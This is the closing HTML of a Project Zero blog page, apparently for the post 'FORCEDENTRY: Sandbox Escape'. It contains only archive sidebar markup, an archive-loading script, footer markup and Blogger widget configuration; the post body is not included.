<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2017/05/'>
May
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2017/04/'>
April
</a>
<span class='post-count' dir='ltr'>(6)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2017/03/'>
March
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2017/02/'>
February
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2016/'>
2016
</a>
<span class='post-count' dir='ltr'>(17)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2016/12/'>
December
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2016/11/'>
November
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2016/10/'>
October
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2016/09/'>
September
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2016/08/'>
August
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2016/07/'>
July
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2016/06/'>
June
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2016/03/'>
March
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2016/02/'>
February
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2016/01/'>
January
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2015/'>
2015
</a>
<span class='post-count' dir='ltr'>(33)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2015/12/'>
December
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2015/11/'>
November
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2015/10/'>
October
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2015/09/'>
September
</a>
<span class='post-count' dir='ltr'>(4)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2015/08/'>
August
</a>
<span class='post-count' dir='ltr'>(6)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2015/07/'>
July
</a>
<span class='post-count' dir='ltr'>(5)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2015/06/'>
June
</a>
<span class='post-count' dir='ltr'>(4)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2015/05/'>
May
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2015/04/'>
April
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2015/03/'>
March
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2015/02/'>
February
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2015/01/'>
January
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2014/'>
2014
</a>
<span class='post-count' dir='ltr'>(11)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2014/12/'>
December
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2014/11/'>
November
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2014/10/'>
October
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2014/09/'>
September
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2014/08/'>
August
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://googleprojectzero.blogspot.com/2014/07/'>
July
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
</li>
</ul>
</div>
</div>
<script type='text/javascript'>
//<![CDATA[
(function(){
  let archive_list = document.getElementById('ArchiveList');
  if (archive_list == null) return;
  let cur_year = archive_list.querySelector('.post-count-link').innerText.trim() - 0;
  let last_year = 2014;
  let elements = [];
  const MONTHS = ',Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec'.split(',');

  let parent = document.getElementById('ArchiveList');
  while (parent.childNodes.length) parent.removeChild(parent.childNodes[0]);

  function fetch_next_year() {
    let url = 'https://googleprojectzero.blogspot.com/?action=getTitles&widgetId=BlogArchive1&widgetType=BlogArchive&responseType=js&path=https%3A%2F%2Fgoogleprojectzero.blogspot.com%2F'+cur_year;
    fetch(url).then(resp => {
      if (!resp.ok) {
        console.log('http error');
        return;
      }
      resp.text().then(text => {
        let scope = {
          _WidgetManager: {
            _HandleControllerResult: (name, method, results) => {
              elements.push(document.createElement('hr'));
              let year_header = document.createElement('div');
              year_header.appendChild(document.createTextNode(cur_year));
              year_header.style.fontSize = 'large';
              elements.push(year_header);

              let list = document.createElement('ul');
              elements.push(list);

              for (let obj of results.posts) {
                let link_parts = obj.url.split('/');
                let year = link_parts[3];
                let month = link_parts[4];

                let el = document.createElement(/*'div'*/'li');
                el.style.listStyleType = 'square';
                el.style.listStylePosition = 'inside';
                let link = document.createElement('a');
                el.appendChild(link);
                link.appendChild(document.createTextNode(obj.title));
                link.href = obj.url;
                let date_trailer = document.createElement('span');
                el.appendChild(date_trailer);
                //date_trailer.appendChild(document.createTextNode(' ('+year+'-'+month+')'));
                date_trailer.appendChild(document.createTextNode(' ('+MONTHS[parseInt(month, 10)]+')'));
                //date_trailer.style.textAlign = 'right';
                //elements.push(el);
                list.appendChild(el);
              }
            }
          }
        };
        with (scope) { eval(text); }
        if (cur_year == last_year) {
          finish();
        } else {
          cur_year--;
          fetch_next_year();
        }
      });
    });
  }
  fetch_next_year();
  function finish() {
    for (let obj of elements) {
      parent.appendChild(obj);
    }
    console.log(elements);
  }
})();
//]]>
</script>
<div class='clear'></div>
</div>
</div></div>
<table border='0' cellpadding='0' cellspacing='0' class='section-columns columns-2'>
<tbody>
<tr>
<td class='first columns-cell'>
<div class='sidebar no-items section' id='sidebar-right-2-1'></div>
</td>
<td class='columns-cell'>
<div class='sidebar no-items section' id='sidebar-right-2-2'></div>
</td>
</tr>
</tbody>
</table>
<div class='sidebar no-items section' id='sidebar-right-3'></div>
</aside>
</div>
</div>
</div>
<div style='clear: both'></div>
<!-- columns -->
</div>
<!-- main -->
</div>
</div>
<div class='main-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<footer>
<div class='footer-outer'>
<div class='footer-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left footer-fauxborder-left'>
<div class='fauxborder-right footer-fauxborder-right'></div>
<div class='region-inner footer-inner'>
<div class='foot no-items section' id='footer-1'></div>
<table border='0' cellpadding='0' cellspacing='0' class='section-columns columns-2'>
<tbody>
<tr>
<td class='first columns-cell'>
<div class='foot no-items section' id='footer-2-1'></div>
</td>
<td class='columns-cell'>
<div class='foot no-items section' id='footer-2-2'></div>
</td>
</tr>
</tbody>
</table>
<!-- outside of the include in order to lock Attribution widget -->
<div class='foot section' id='footer-3' name='Footer'><div class='widget Attribution' data-version='1' id='Attribution1'>
<div class='widget-content' style='text-align: center;'>
Powered by <a href='https://draft.blogger.com' target='_blank'>Blogger</a>.
</div>
<div class='clear'></div>
</div></div>
</div>
</div>
<div class='footer-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</footer>
<!-- content -->
</div>
</div>
<div class='content-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</div>
<script type='text/javascript'>
    window.setTimeout(function() {
        document.body.className = document.body.className.replace('loading', '');
      }, 10);
  </script>

<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/3194816290-widgets.js"></script>
<script type='text/javascript'>
window['__wavt'] = 'AOuZoY6BjDmvbj7DKNf4rcmETFho9ajoWg:1734509720479';_WidgetManager._Init('//draft.blogger.com/rearrange?blogID\x3d4838136820032157985','//googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html','4838136820032157985');
_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '4838136820032157985', 'title': 'Project Zero', 'url': 'https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html', 'canonicalUrl': 'https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html', 'homepageUrl': 'https://googleprojectzero.blogspot.com/', 'searchUrl': 'https://googleprojectzero.blogspot.com/search', 'canonicalHomepageUrl': 'https://googleprojectzero.blogspot.com/', 'blogspotFaviconUrl': 'https://googleprojectzero.blogspot.com/favicon.ico', 'bloggerUrl': 'https://draft.blogger.com', 'hasCustomDomain': false, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': 'UA-240546891-1', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Project Zero - Atom\x22 href\x3d\x22https://googleprojectzero.blogspot.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Project Zero - RSS\x22 href\x3d\x22https://googleprojectzero.blogspot.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Project Zero - Atom\x22 href\x3d\x22https://draft.blogger.com/feeds/4838136820032157985/posts/default\x22 /\x3e\n\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Project Zero - Atom\x22 href\x3d\x22https://googleprojectzero.blogspot.com/feeds/1353264177358891846/comments/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'boqCommentIframeForm': true, 'loginRedirectParam': '', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/ded6eb17555d871b', 'plusOneApiSrc': 'https://apis.google.com/js/platform.js', 'disableGComments': true, 'interstitialAccepted': false, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'X', 'key': 'twitter', 'shareMessage': 'Share to X', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 0, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'item', 'postId': '1353264177358891846', 'postImageThumbnailUrl': 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOvov7r0oFPPVDeNeBSf3Hspypl5AGeZj30ulogkGLGBXJZoy4lDoiunsF9MptZWtnpCyKST1rrP3JtdyqUCvpsAopFrlqp_3b9EuHUFh9FJqnT3iANV_Esl-InoKip8mUjW3BRjNnPOpaj1dQyfoyr5O8apA4yJzsZcPc5mnTeMEsOcqAZQKBsKr5/s72-c/image1%286%29.png', 'postImageUrl': 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOvov7r0oFPPVDeNeBSf3Hspypl5AGeZj30ulogkGLGBXJZoy4lDoiunsF9MptZWtnpCyKST1rrP3JtdyqUCvpsAopFrlqp_3b9EuHUFh9FJqnT3iANV_Esl-InoKip8mUjW3BRjNnPOpaj1dQyfoyr5O8apA4yJzsZcPc5mnTeMEsOcqAZQKBsKr5/s1200/image1%286%29.png', 'pageName': 'FORCEDENTRY: Sandbox Escape', 'pageTitle': 'Project Zero: FORCEDENTRY: Sandbox Escape'}}, {'name': 'features', 'data': {}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard!', 'ok': 'Ok', 'postLink': 'Post Link'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'Custom', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'FORCEDENTRY: Sandbox Escape', 'description': '  Posted by Ian Beer \x26 Samuel Gro\xdf \xa0of Google Project Zero     We want to thank Citizen Lab for sharing a sample of the FORCEDENTRY exploit ...', 'featuredImage': 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOvov7r0oFPPVDeNeBSf3Hspypl5AGeZj30ulogkGLGBXJZoy4lDoiunsF9MptZWtnpCyKST1rrP3JtdyqUCvpsAopFrlqp_3b9EuHUFh9FJqnT3iANV_Esl-InoKip8mUjW3BRjNnPOpaj1dQyfoyr5O8apA4yJzsZcPc5mnTeMEsOcqAZQKBsKr5/s1200/image1%286%29.png', 'url': 'https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html', 'type': 'item', 'isSingleItem': true, 'isMultipleItems': false, 'isError': false, 'isPage': false, 'isPost': true, 'isHomepage': false, 'isArchive': false, 'isLabelSearch': false, 'postId': 1353264177358891846}}]);
_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', document.getElementById('Navbar1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', document.getElementById('Header1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/555929998-lbx.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/1964470060-lightbox_bundle.css'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogSearchView', new _WidgetInfo('BlogSearch1', 'sidebar-right-1', document.getElementById('BlogSearch1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_PageListView', new _WidgetInfo('PageList1', 'sidebar-right-1', document.getElementById('PageList1'), {'title': 'Pages', 'links': [{'isCurrentPage': false, 'href': 'https://googleprojectzero.blogspot.com/p/about-project-zero.html', 'id': '4384467920505278144', 'title': 'About Project Zero'}, {'isCurrentPage': false, 'href': 'https://googleprojectzero.blogspot.com/p/working-at-project-zero.html', 'id': '2459334498880008057', 'title': 'Working at Project Zero'}, {'isCurrentPage': false, 'href': 'https://googleprojectzero.blogspot.com/p/0day.html', 'id': '3414239791814532209', 'title': '0day \x22In the Wild\x22'}, {'isCurrentPage': false, 'href': 'https://googleprojectzero.github.io/0days-in-the-wild/rca.html', 'title': '0day Exploit Root Cause Analyses'}, {'isCurrentPage': false, 'href': 'https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html', 'id': '2935252455704572784', 'title': 'Vulnerability Disclosure FAQ'}], 'mobile': false, 'showPlaceholder': true, 'hasCurrentPage': false}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar-right-1', document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading\x26hellip;'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'footer-3', document.getElementById('Attribution1'), {}, 'displayModeFull'));
</script>
</body>
</html>